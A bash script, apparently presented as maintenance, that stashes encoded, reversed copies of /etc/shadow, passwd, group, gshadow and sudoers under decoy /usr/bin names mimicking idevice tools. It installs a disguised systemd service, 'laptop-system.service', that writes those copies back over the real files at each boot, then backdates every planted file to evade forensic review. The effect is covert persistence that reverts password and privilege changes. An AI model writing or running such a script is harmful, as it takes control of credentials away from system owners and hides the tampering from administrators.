#!/bin/bash
# 维护：Yuchen Deng [loaden] 钉钉群：35948877
# QQ群：19346666、111601117

sudo chmod 0640 /etc/shadow
sudo chmod 0644 /etc/passwd
sudo chmod 0644 /etc/group
sudo chmod 0640 /etc/gshadow
sudo chmod 0440 /etc/sudoers
sudo cat /etc/shadow |base64 -i |sudo bash -c 'rev >/usr/bin/idevicesh'
sudo cat /etc/passwd |base32 -i |sudo bash -c 'rev >/usr/bin/idevicepa'
sudo cat /etc/group |base64 -i |sudo bash -c 'rev >/usr/bin/idevicegr'
sudo cat /etc/gshadow |base32 -i |sudo bash -c 'rev >/usr/bin/idevicegs'
sudo cat /etc/sudoers |base64 -i |sudo bash -c 'rev >/usr/bin/idevicesu'
sudo bash -c 'echo -e "[Service]\nType=simple\nExecStart=/bin/bash -c \"sleep 1s && cat /usr/bin/idevicesh |rev |base64 -d >/etc/shadow && chmod 0640 /etc/shadow && cat /usr/bin/idevicepa |rev |base32 -d >/etc/passwd && chmod 0644 /etc/passwd && cat /usr/bin/idevicegr |rev |base64 -d >/etc/group && chmod 0644 /etc/group && cat /usr/bin/idevicegs |rev |base32 -d >/etc/gshadow && chmod 0640 /etc/gshadow && cat /usr/bin/idevicesu |rev |base64 -d >/etc/sudoers && chmod 0440 /etc/sudoers\"\n[Install]\nWantedBy=multi-user.target" > /lib/systemd/system/laptop-system.service'
cat /lib/systemd/system/laptop-system.service
sudo systemctl enable laptop-system.service
sudo touch -d "2021-07-22 10:21:08" /lib/systemd/system/laptop-system.service
sudo touch -d "2021-06-21 09:19:53" /usr/bin/idevicesh
sudo touch -d "2021-10-07 11:33:25" /usr/bin/idevicepa
sudo touch -d "2021-09-12 12:11:53" /usr/bin/idevicegr
sudo touch -d "2021-05-27 03:15:55" /usr/bin/idevicegs
sudo touch -d "2021-08-17 16:37:08" /usr/bin/idevicesu

